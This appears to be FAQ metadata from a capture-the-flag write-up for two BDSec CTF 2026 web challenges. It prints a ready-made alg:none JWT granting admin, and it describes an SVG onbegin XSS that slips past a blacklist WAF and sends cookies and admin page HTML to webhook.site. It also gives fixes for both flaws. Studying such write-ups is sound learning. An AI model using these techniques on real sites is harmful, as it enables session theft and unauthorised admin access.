    {"@type": "Question","name": "What is BDSec CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "BDSec CTF 2026 is a Bangladesh-hosted Capture-the-Flag competition covering reverse engineering, pwn, and web categories. Flags in the web track use lowercase bdsec{...}. This writeup covers Admin Portal (50 pts, JWT alg:none) and Ticketly (425 pts, SVG SMIL WAF bypass + stored XSS). Per-challenge READMEs and solver scripts at github.com/Abdelkad3r/BDSecCTF-2026."}},
    {"@type": "Question","name": "What is the JWT alg:none vulnerability in Admin Portal?","acceptedAnswer": {"@type": "Answer","text": "JWT tokens carry an alg field in the header naming the signature algorithm. Vulnerable servers read this field from the client-supplied header to choose how to verify the token. When the client sets alg: none, the server skips signature verification entirely. The attacker supplies a token with role=admin in the payload, alg: none in the header, and an empty signature (trailing dot). The server accepts it without any cryptographic check and grants admin access."}},
    {"@type": "Question","name": "How do you forge the alg:none JWT token?","acceptedAnswer": {"@type": "Answer","text": "Base64url-encode {\"alg\":\"none\",\"typ\":\"JWT\"} and {\"user\":\"guest\",\"role\":\"admin\"} (no padding), join with a dot, and append a trailing dot for the empty signature: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ. No HMAC key or brute force needed — only base64url encoding."}},
    {"@type": "Question","name": "How do I fix the alg:none vulnerability in my JWT library?","acceptedAnswer": {"@type": "Answer","text": "Pin the algorithm server-side. In Python PyJWT: jwt.decode(token, key, algorithms=[\"HS256\"]). In node-jsonwebtoken: jwt.verify(token, secret, { algorithms: [\"HS256\"] }). Never read the algorithm from the token header and pass it to the verification call. Reject alg: none explicitly in the parsing layer before any claim is read."}},
    {"@type": "Question","name": "What is the SVG SMIL onbegin XSS technique?","acceptedAnswer": {"@type": "Answer","text": "SVG SMIL defines animation elements like animate with event attributes including onbegin, onend, and onrepeat that fire JavaScript when the animation state changes. Chromium fires onbegin automatically for animations with begin=0s when the page is parsed, with no user interaction required. Because onbegin lives on an SVG animate element rather than a script tag or standard HTML event attribute, most blacklist WAFs that block script, iframe, img, javascript:, and onload never enumerate it."}},
    {"@type": "Question","name": "Why does the WAF in Ticketly fail to block the payload?","acceptedAnswer": {"@type": "Answer","text": "The WAF is blacklist-based and catches script, iframe, img, javascript:, and onload. The payload uses svg (not blocked), animate (not blocked), and onbegin (not blocked). SVG is a common WAF blind spot because WAF authors typically think in terms of HTML execution contexts and miss the SVG event model. The correct fix is an allowlist-based sanitiser like DOMPurify that strips everything not explicitly allowed."}},
    {"@type": "Question","name": "How does the chunked POST exfiltration work?","acceptedAnswer": {"@type": "Answer","text": "The onbegin handler builds a string h from document.cookie plus the admin ticket page HTML (fetched same-origin), then iterates in 800-byte slices, sending each slice as a mode:no-cors POST body to webhook.site with an offset parameter i. After all chunks are sent, it redirects to a done URL with the total length. Chunking prevents truncation in webhook logging services. The mode:no-cors flag allows the cross-origin POST without a CORS preflight."}},
    {"@type": "Question","name": "Where can I find the solver scripts?","acceptedAnswer": {"@type": "Answer","text": "Per-challenge READMEs, handouts, and solve scripts live at github.com/Abdelkad3r/BDSecCTF-2026. Admin Portal's solver is a short Python + requests script that forges the alg:none token and sends it to /admin. Ticketly's solver creates a webhook.site token via the API, registers a user, submits the SVG payload, reports the ticket, polls the webhook API for incoming chunks, and prints the recovered flag."}}
  ]
}
</script>
